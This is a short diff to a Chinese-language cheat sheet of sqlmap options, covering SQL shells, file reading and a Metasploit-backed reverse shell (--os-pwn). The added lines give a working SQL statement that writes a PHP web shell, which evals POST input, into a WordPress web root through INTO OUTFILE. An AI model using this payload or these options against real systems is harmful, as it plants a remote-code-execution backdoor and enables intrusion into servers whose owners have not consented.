@@ -94,7 +94,7 @@
 
 - --sql-shell 执行指定sql命令
 
-- --sql-query执行执行的sql语句
+- --sql-query执行的sql语句
 
 - --file-read 读取指定文件
 
@@ -111,3 +111,10 @@
 - --os-pwn 反弹shell shell(–os-pwn –msf-path=/opt/framework/msf3/) 
 
 - –msf-path=  #matesploit绝对路径(–msf-path=/opt/framework/msf3/)
+
+- sql执行写入文件
+  ```sql
+  select '<?php phpinfo();@eval($_POST["shell"]);?>' into outfile '/var/www/wordpress/shell.php' from admin;
+  ```
+
+  
